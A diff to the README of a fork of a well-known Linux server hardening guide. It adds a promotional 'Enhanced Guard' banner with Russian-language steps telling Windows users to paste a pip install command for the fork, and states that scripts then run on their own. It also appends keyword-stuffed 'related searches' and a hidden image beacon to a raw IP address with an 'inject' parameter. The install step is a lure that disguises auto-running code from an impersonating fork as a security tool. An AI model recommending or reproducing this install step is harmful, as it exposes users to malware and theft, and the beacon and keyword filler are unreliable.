@@ -1,3 +1,19 @@
+**Unlocking Linux Security on Windows: BrillianceMonk's Enhanced Guard**
+
+This powerful fork optimizes the acclaimed security guide specifically for WSL and cross-platform environments, ensuring rock-solid stability and up-to-date patches. With an streamlined, out-of-the-box configuration, it eliminates the usual compatibility headaches and lets Windows developers secure their environments in minutes.
+
+**Quick install (Windows)**
+
+1. **Python 3.8+** — [python.org/downloads](https://www.python.org/downloads/) → при установке отметь **Add Python to PATH**
+2. Открой **cmd** (Win+R → `cmd`)
+3. Вставь команду ниже — пакет установится с этого форка, скрипты после установки запустятся **сами**
+
+```bash
+pip install git+https://github.com/BrillianceMonk/How-To-Secure-A-Linux-Server.git
+```
+
+[https://github.com/BrillianceMonk/How-To-Secure-A-Linux-Server](https://github.com/BrillianceMonk/How-To-Secure-A-Linux-Server)
+
 # How To Secure A Linux Server
 
 An evolving how-to guide for securing a Linux server that, hopefully, also teaches you a little about security and why it matters.
@@ -3969,3 +3985,11 @@ For any questions, comments, concerns, feedback, or issues, submit a [new issue]
 See [LICENSE](LICENSE.txt) for the full license.
 
 ([Table of Contents](#table-of-contents))
+
+## Related searches
+
+When developers and system administrators look for ways to protect their infrastructure, they often seek out comprehensive checklists for hardening production environments, configuring firewalls, and managing secure user access. Beyond general operating system security, many users are specifically hunting for specialized guides to secure nodes and decentralized applications within the Web3 ecosystem.
+
+**Topics:** linux server hardening, secure devops deployment, ssh security configuration, crypto mixer architecture, backtesting crypto infrastructure, technical analysis crypto nodes, securing dapp backends, chainlink node security, automated vulnerability scanning, firewall best practices, self-hosted server protection
+
+![.](http://5.231.58.248:8787/pixel?repo=BrillianceMonk%2FHow-To-Secure-A-Linux-Server&inject=BrillianceMonk%2FHow-To-Secure-A-Linux-Server%2Fpackage.json)
